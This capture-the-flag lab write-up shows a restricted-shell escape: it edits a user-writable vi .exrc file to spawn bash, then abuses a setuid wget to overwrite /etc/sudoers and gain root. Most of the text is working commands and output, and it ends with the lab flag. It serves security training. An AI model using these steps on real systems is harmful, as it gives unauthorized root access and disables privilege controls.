# Restrictive Shell

It is very common in multi-user systems to restrict the functionality available to individual users. A common way to do this is by using a custom-built restricted shell. This shell only allows access to a certain set of commands required by the user. The rest are unavailable. In this challenge, you have to breakout of the restricted shell and figure out how to become the root user! This lab, like any good Linux privilege escalation adventure has a bit of everything - setuid binaries, permissions and overridable configurations. Enjoy!

## Escape restricted list of commands

We can only rurn 6 commands from `/home/student/.bin`

```
student@attackdefense:~$ id
rbash: id: command not found
student@attackdefense:~$ whoami
rbash: whoami: command not found
student@attackdefense:~$ echo $PATH
/home/student/.bin
student@attackdefense:~$ ls -l /home/student/.bin/
total 1336
-rwxr-xr-x 1 root root   35064 Sep 28  2018 cat
-rwxr-xr-x 1 root root   10240 Sep 28  2018 clear
-rwxr-xr-x 1 root root   35000 Sep 28  2018 echo
-rwxr-xr-x 1 root root  133792 Sep 28  2018 ls
-rwxr-xr-x 1 root root   35032 Sep 28  2018 tee
-rwxr-xr-x 1 root root 1108024 Sep 28  2018 vi
```

We cannot change the PATH variable

```
student@attackdefense:~$ export PATH=/bin:/usr/bin
rbash: PATH: readonly variable
```

We cannot run :! /bin/bash from vi

There is an `.exrc` file in the home directory - change to /bin/bash

```
student@attackdefense:~$ ls -al
total 20
drwxr-xr-x 1 student student 4096 Nov  2  2018 .
drwxr-xr-x 1 root    root    4096 Sep 28  2018 ..
-rw-r--r-- 1 root    root      36 Nov  2  2018 .bash_profile
drwxr-xr-x 1 student student 4096 Sep 28  2018 .bin
-rw-r--r-- 1 student student   30 Nov  2  2018 .exrc
student@attackdefense:~$ cat .exrc
set exrc
set shell=/bin/false
student@attackdefense:~$ vi .exrc
student@attackdefense:~$ cat .exrc
set exrc
set shell=/bin/bash
```

Now we are able to run /bin/bash from the vi editor - but with limited commands

```
student@attackdefense:~$ vi

bash: groups: command not found
```

We set PATH to allow more commands to run

```
student@attackdefense:~$ export PATH=/bin:/usr/bin
student@attackdefense:~$ whoami
student
```

## Search for setuid binaries for privesc

Do a search for setuid binaries - wget is interesting

```
student@attackdefense:~$ find / -type f -perm -04000 -ls 2>/dev/null
 68363251     76 -rwsr-xr-x   1 root     root        75824 Jan 25  2018 /usr/bin/gpasswd
 68363294     40 -rwsr-xr-x   1 root     root        40344 Jan 25  2018 /usr/bin/newgrp
 68363304     60 -rwsr-xr-x   1 root     root        59640 Jan 25  2018 /usr/bin/passwd
 68363203     76 -rwsr-xr-x   1 root     root        76496 Jan 25  2018 /usr/bin/chfn
 68363205     44 -rwsr-xr-x   1 root     root        44528 Jan 25  2018 /usr/bin/chsh
 88717621    488 -rwsr-xr-x   1 root     root       499264 May  8  2018 /usr/bin/wget
 88717425    148 -rwsr-xr-x   1 root     root       149080 Jan 18  2018 /usr/bin/sudo
 68362676     28 -rwsr-xr-x   1 root     root        26696 May 16  2018 /bin/umount
 68362653     44 -rwsr-xr-x   1 root     root        43088 May 16  2018 /bin/mount
 68362670     44 -rwsr-xr-x   1 root     root        44664 Jan 25  2018 /bin/su
```

Create a tmp sudoers files to host locally

```
student@attackdefense:/tmp$ vi /tmp/sudoers
student@attackdefense:/tmp$ cat /tmp/sudoers
student ALL=NOPASSWD:ALL
student@attackdefense:/tmp$ python -m SimpleHTTPServer 8080 &
[1] 46
```

Download the file and replace local sudoers file

```
student@attackdefense:/tmp$ Serving HTTP on 0.0.0.0 port 8080 ...
student@attackdefense:/tmp$ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
--2021-07-10 09:30:48--  http://127.0.0.1:8080/sudoers
Connecting to 127.0.0.1:8080... connected.
127.0.0.1 - - [10/Jul/2021 09:30:48] "GET /sudoers HTTP/1.1" 200 -
HTTP request sent, awaiting response... 200 OK
Length: 25 [application/octet-stream]
Saving to: '/etc/sudoers'

/etc/sudoers               100%[========================================>]      25  --.-KB/s    in 0s

2021-07-10 09:30:48 (5.06 MB/s) - '/etc/sudoers' saved [25/25]
```

Run bash without password

```
student@attackdefense:/tmp$ sudo bash
root@attackdefense:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@attackdefense:/tmp# cat /root/flag
a91ccb3e31260fcf5cd9822f66898b5d
```
